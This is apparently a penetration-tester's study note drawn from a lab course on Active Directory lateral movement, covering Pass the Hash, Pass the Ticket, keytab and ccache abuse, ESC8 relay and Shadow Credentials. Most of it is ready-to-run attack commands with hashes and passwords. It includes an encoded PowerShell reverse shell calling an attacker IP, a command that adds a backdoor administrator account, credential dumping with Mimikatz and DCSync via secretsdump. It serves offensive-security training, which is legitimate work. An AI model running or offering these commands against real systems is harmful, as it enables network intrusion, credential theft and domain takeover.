# Windows Lateral Movement Techniques

## 1.Pass the Hash (PtH)

&#x20;Hashes can be obtained in several ways, including:

* Dumping the local SAM database from a compromised host.
* Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
* Pulling the hashes from memory (lsass.exe).

### Pass the Hash with Mimikatz (Windows)

Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.&#x20;

> * `/user` - The user name we want to impersonate.
> * `/rc4` or `/NTLM` - NTLM hash of the user's password.
> * `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
> * `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```cmd-session
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

Now we can use cmd.exe to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FsDTJ3NHoOMoRhiDySAdK%2Fimage.png?alt=media&amp;token=5c71b0aa-6308-49cc-8aa1-dc48399074d7" alt=""><figcaption></figcaption></figure>

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

### **Invoke-TheHash with SMB**

```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

**Netcat listener**

```powershell-session
PS C:\tools> .\nc.exe -lvnp 8001
```

To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`, as shown in the following image.<br>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FuOPbp8EZmKzK4Ny958PT%2Fimage.png?alt=media&amp;token=45e030a9-b2ac-48a1-a222-86e56a0ab105" alt=""><figcaption></figcaption></figure>

***

### Invoke-TheHash with WMI

```
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F99eAJluO5lNYYo888xJk%2Fimage.png?alt=media&amp;token=0492a70c-4118-4cff-9c1b-ead0b4ddc56f" alt=""><figcaption></figcaption></figure>

## Pass the Hash with Impacket (Linux)

**Pass the Hash with Impacket PsExec**

```shell-session
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### Pass the Hash with NetExec (Linux)

```shell-session
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command.&#x20;

**NetExec - Command Execution**

```shell-session
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Pass the Hash with evil-winrm (Linux)

```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

## Pass the Hash with RDP (Linux)

We can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

* `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

\
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

### **Enable Restricted Admin Mode to allow PtH**

```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FRUXsDkzB0zYbN4gn1wSG%2Fimage.png?alt=media&amp;token=5af2dee9-c53f-4731-8d28-495129b3aa89" alt=""><figcaption></figcaption></figure>

* Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fjq30lLqiLrKJy1PjlPWz%2Fimage.png?alt=media&amp;token=49683b26-95f7-46fd-aa10-8487a8923676" alt=""><figcaption></figcaption></figure>

### UAC limits Pass the Hash for local accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

> Note: There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).

***

## 2.Pass the Ticket (PtT) from Windows

* The `Ticket Granting Ticket` (`TGT`) is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
* The `Ticket Granting Service` (`TGS`) is requested by users who want to use a service. These tickets allow services to verify the user's identity.

## Pass the Ticket (PtT) attack

### Harvesting Kerberos tickets from Windows

```cmd-session
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # exit
c:\tools> dir *.kirbi
```

> The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.

Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

### Rubeus

* We can also export tickets using `Rubeus` and the option `dump`.
* We are adding the option `/nowrap` for easier copy-paste.

```cmd-session
c:\tools> Rubeus.exe dump /nowrap
```

> Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

## Pass the Key aka. OverPass the Hash

### Mimikatz - Extract Kerberos keys

```cmd-session
c:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

> Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using `Mimikatz` and `Rubeus`.

### Mimikatz - Pass the Key aka. OverPass the Hash

```cmd-session
c:\tools> mimikatz.exe
mimikatz # privilege::debug
```

> This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
>
> To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the AES-256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.

### Rubeus - Pass the Key aka. OverPass the Hash

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

> Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
>
> To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`&#x20;
>
> **Documentation:** <https://github.com/GhostPack/Rubeus#example-over-pass-the-hash>

## Pass the Ticket (PtT)

### Rubeus - Pass the Ticket

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

> Note that now it displays `Ticket successfully imported!`.
>
> Another way is to import the ticket into the current session using the `.kirbi` file from the disk.
>
> Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.

### Rubeus - Pass the Ticket

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Convert .kirbi to Base64 Format

```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

* Using Rubeus, we can perform a Pass the Ticket providing the Base64 string instead of the file name.

### Pass the Ticket - Base64 Format

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
```

> Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.

### Mimikatz - Pass the Ticket

```cmd-session
C:\tools> mimikatz.exe 
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
mimikatz # exit
c:\tools> dir \\DC01.inlanefreight.htb\c$
```

> Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

## Pass The Ticket with PowerShell Remoting (Windows)

### Mimikatz - PowerShell Remoting with Pass the Ticket

### **Mimikatz - Pass the Ticket for lateral movement**

```cmd-session
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
mimikatz # exit
```

```cmd-session
c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
[DC01]: PS C:\Users\john\Documents> hostname
```

## Rubeus - PowerShell Remoting with Pass the Ticket

> Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

### Create a sacrificial process with Rubeus

```cmd-session
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

### Rubeus - Pass the Ticket for lateral movement

```cmd-session
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

## 3.Pass the Ticket (PtT) from Linux

**Linux auth from MS01**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FamhwVvZbJKBb4kUIiMW6%2Fimage.png?alt=media&amp;token=dbfcdbc0-fe77-4da8-b565-fe6615259642" alt=""><figcaption></figcaption></figure>

As an alternative, we created a port forward to simplify the interaction with `LINUX01`. By connecting to port TCP/2222 on `MS01`, we will gain access to port TCP/22 on `LINUX01`.

Let's assume we are in a new assessment, and the company gives us access to `LINUX01` and the user `david@inlanefreight.htb` and password `Password2`.

### Linux auth via port forward

```shell-session
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

## Identifying Linux and Active Directory integration

> We can identify if the Linux machine is domain-joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

### realm - Check if Linux machine is domain-joined

```shell-session
david@inlanefreight.htb@linux01:~$ realm list
```

> In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). Looking for those services running in the machine is another way to identify if it is domain-joined. We can read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details. Let's search for those services to confirm if the machine is domain-joined.

### PS - Check if Linux machine is domain-joined

```shell-session
ps -ef | grep -i "winbind\|sssd"
```

## Finding Kerberos tickets in Linux

### Finding KeyTab files

> Note: To use a keytab file, we must have read and write (rw) privileges on the file.

```shell-session
find / -name *keytab* -ls 2>/dev/null
```

### **Identifying KeyTab files in Cronjobs**

```shell-session
crontab -l
```

In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos&#x20;

we found a script importing a Kerberos ticket (`svc_workstations.kt`) for the user `svc_workstations@INLANEFREIGHT.HTB` before trying to connect to a shared folder. We'll later discuss how to use those tickets and impersonate users.

### Finding ccache files

```shell-session
env | grep -i krb5
```

**Searching for ccache files in /tmp**

```shell-session
ls -la /tmp
```

## Abusing KeyTab files

**Listing KeyTab file information**

```shell-session
klist -k -t /opt/specialfiles/carlos.keytab 
```

### **Impersonating a user with a KeyTab**

```shell-session
klist 
```

We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.

### **Connecting to SMB Share as Carlos**

```shell-session
smbclient //dc01/carlos -k -c ls
```

## KeyTab Extract

We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos.&#x20;

### Extracting KeyTab hashes with KeyTabExtract

```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

python3 /opt/keytabextract.py /opt/specialfiles/user.keytab
```

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.

The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it.

**quick way:**

* <https://crackstation.net/>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FA37OT4IOe0Th8mGAPRIg%2Fimage.png?alt=media&amp;token=30036ac5-f6e0-4a94-848c-745d19319626" alt=""><figcaption></figcaption></figure>

**Log in as Carlos**

* we got Password5 so lets login

```shell-session
su - carlos@inlanefreight.htb
```

### Obtaining more hashes

Carlos has a cronjob that uses a KeyTab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.

## Abusing KeyTab ccache

### Privilege escalation to root

```shell-session
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
sudo -l
sudo su
whoami
```

### Looking for ccache files

```shell-session
ls -la /tmp
```

### Identifying group membership with the id command

```shell-session
id julio@inlanefreight.htb
```

Julio is a member of the `Domain Admins` group. We can attempt to impersonate the user and gain access to the `DC01` Domain Controller host.

To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.

### Importing the ccache file into our current session

```shell-session
root@linux01:~# klist
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
root@linux01:~# klist
```

### Using Linux attack tools with Kerberos

**Host file modified**

```shell-session
cat /etc/hosts

# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

\
**Proxychains configuration file**

```shell-session
cat /etc/proxychains.conf

...SNIP...

[ProxyList]
socks5 127.0.0.1 1080
```

We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.

**Download Chisel to our attack host**

```shell-session
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
```

Connect to `MS01` via RDP and execute chisel (located in C:\Tools).

```shell-session
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

**Execute chisel from MS01**

```cmd-session
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

> Note: The client IP is your attack host IP.

Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.

\
**Setting the KRB5CCNAME environment variable**

```shell-session
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### **Using Impacket with proxychains and Kerberos authentication**

```shell-session
proxychains impacket-wmiexec dc01 -k
```

> Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

### Evil-WinRM

```shell-session
sudo apt-get install krb5-user -y
```

**Default Kerberos v5 realm**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fap53biaZwWwnqnELOhHa%2Fimage.png?alt=media&amp;token=75a9ac71-5b2e-46c3-ba4b-1c21ef3daa64" alt=""><figcaption></figcaption></figure>

The Kerberos servers can be empty.

**Administrative server for your Kerberos realm**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FrCPwkjcHWWZXbA6P3R7V%2Fimage.png?alt=media&amp;token=5d1084e9-2ce6-47dc-9433-3ed446517c2a" alt=""><figcaption></figcaption></figure>

In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values

**Kerberos configuration file for INLANEFREIGHT.HTB**

```shell-session
cat /etc/krb5.conf

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

...SNIP...

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

...SNIP...
```

Now we can use evil-winrm.

### Using Evil-WinRM with Kerberos

```shell-session
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Miscellaneous

## **Impacket Ticket converter**

```shell-session
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.<br>

### **Importing converted ticket into Windows session with Rubeus**

```cmd-session
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
C:\htb>dir \\dc01\julio
```

### Linikatz

* <https://github.com/CiscoCXSecurity/linikatz>

**Linikatz download and execution**

```shell-session
Olanzapine@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
Olanzapine@htb[/htb]$ /opt/linikatz.sh
```

## 4.Pass the Certificate

### AD CS NTLM Relay Attack (ESC8)

`ESC8`—as described in the [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) paper—is an NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enrollment methods, `including web enrollment`, which by default occurs over HTTP. A certificate authority configured to allow web enrollment typically hosts the following application at `/CertSrv`:

![Microsoft Active Directory Certificate Services webpage for inlanefreight-CA01-CA. Options to request a certificate, view pending requests, or download a certificate chain or CRL.](https://academy.hackthebox.com/storage/modules/308/img/PtC_1.png)

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service

### Impacket-ntlmrelayx

```shell-session
 impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

> Note: The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running.&#x20;

```shell-session
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application.

* We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:

### gettgtpkinit.py

```shell-session
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

Then, we can begin the attack

> Note: If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

```shell-session
pip3 install -I git+https://github.com/wbond/oscrypto.git
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

> Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

### Secretsdump

```shell-session
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

## Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FJI2AaQLbA1R982zmghg4%2Fimage.png?alt=media&amp;token=a3ca2a9e-6675-4769-855a-1fa9319d1551" alt=""><figcaption></figcaption></figure>

> We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:

### pywhisker

```
 pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

In the output above, we can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

```shell-session
 python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

With the TGT obtained, we may once again `pass the ticket`:

### pass the ticket

```shell-session
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```

if the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

```shell-session
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

### No PKINIT?

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).
